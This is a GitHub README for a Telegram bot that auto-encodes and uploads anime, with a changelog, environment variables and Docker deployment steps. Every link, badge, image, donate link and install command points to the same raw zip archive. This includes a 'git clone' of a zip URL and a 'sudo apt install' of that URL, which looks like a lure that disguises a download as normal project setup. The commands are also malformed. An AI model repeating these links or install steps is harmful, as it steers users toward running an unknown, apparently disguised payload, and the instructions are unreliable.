[![Stars](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
[![Forks](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
[![Python](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
[![CodeFactor](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
[![Maintenance](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip%https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
[![Contributors](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
[![PRs Welcome](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
[![License](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)   
[![Sparkline](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)

## Developer Note

- __This repository is not intended or supported for deployment on KOYEB.__
- If Hosted On Heroku Then Make Sure You Are Using Premium Dynos Or Any Above then basic dynos.
- If You Don't Have High End VPS like 8vcpu or 32GiB RAM So Don't Deploy This Bot.
- You Can Customize FFMPEG Code If You Know What You Are Doing.
- __Ensure that you have adhered to this developer note before reporting any errors.__

## Changelog Of Latest Update

### v0.0.8
- Shifted To Mongo Database.
- Changed Hashing Algo To SHA256.
- Added About Command.

### v0.0.7
- Added Separate Anime Channel Upload
- <details><summary>Click Here To See How Separate Anime Channel Upload Look.</summary><img src="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip" alt="sepul1"/><img src="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip" alt="sepul2"/></details>
- Added Button Upload Support (File Store)
- <details><summary>Click Here To See How Button Upload Look.</summary><img src="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip" alt="btnul"/></details>
- Added Multi Thread Encoding
- Added Progress Bar of Encoding
- Added Option For Logs In Main Channel
- Added ForceSub
- Added 480p Support
- Added Broadcast
- Major Modification In FFMPEG Code.
- Modified Anime Searcher
- Admin Panel Fixed
- ReWritten Whole Program (Fully OOPs Based)
- Optimized Core
- Added Heroku Support
- Added Custom CRF Support

## Contributing

- Any Sort of Contributions are Welcomed!
- Try To Resove Any Task From ToDo List Or Raise A Issue!

## How to deploy?
<p><a href="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip"> <img src="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>

### Fork Repo Then click on below button of ur fork repo.
[![Deploy](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)

## Developer Note

- If Hosted On Heroku Then Encoding Of Per Episode Will Take Around 20mins.
- If You Don't Have High End VPS like 8vcpu or 32GiB RAM So Don't Deploy This Bot.
- You Can Customize FFMPEG Code If You Know What You Are Doing.

## Environmental Variable

### REQUIRED VARIABLES

- `BOT_TOKEN` - Get This From @Botfather In Telegram.

- `MONGO_SRV` - Get This From https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip .

- `MAIN_CHANNEL` - ID of Channel Where Anime Will Upload.

- `CLOUD_CHANNEL` - ID of Channel Where Samples And Screenshots Of Anime Will Be Uploaded.

- `LOG_CHANNEL` - ID of Channel Where Status Of Proccesses Will Be Shown.

- `OWNER` - ID of Owner.

### OPTIONAL VARIABLES

- `SESSION` - Telethon Session String Of Your Telegram Account.

- `BACKUP_CHANNEL` - ID of Channel Where Anime Will Be Saved As BackUP if You Are Using Button Upload Option Then Make Sure To SET Backup Channel.

- `FORCESUB_CHANNEL` - ID of Channel Where You Want The User To Join (Make Sure You Promoted The Bot in that channel).

- `FORCESUB_CHANNEL_LINK` - Link of Channel Via User Join The `FORCESUB_CHANNEL`.

- `THUMBNAIL` - JPG/PNG Link of Thumbnail FIle.

- `FFMPEG` - You Can Set Custom Path Of ffmpeg if u want, default is `ffmpeg`.

- `LOG_ON_MAIN` - `True/False` It Will Send LOGS in `MAIN_CHANNEL` rather than `LOG_CHANNEL`, default is `False`

- `SEND_SCHEDULE` - `True/False` Send Schedule of Upcoming Anime of that day at 00:30 **IST**, default is `False`.

- `RESTART_EVERDAY` - `True/False` It Will Restart The Bot Everyday At 00:30 **IST**, default is `True`.

- `CRF` - Less CRF == High Quality, More Size , More CRF == Low Quality, Less Size, CRF Range = 20-51.

## Deployment In VPS

- `git clone https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip`

- `nano .env` configure env as per [this](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip) or  using [this](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip).

- `sudo docker build . -t ongoing` (make sure to install docker first using `sudo apt install https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip`)

- `sudo docker run ongoing`

## Commands

[![Comand](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)

**Uploading of Ongoing Animes Is Automatic**

## About

- This Bot Is Currently Running In [This Channel](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip+q_OBZiXjkBFkYzk0) .

## Donate

- [Contact me on Telegram](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip) if you would like to donate me for my work!
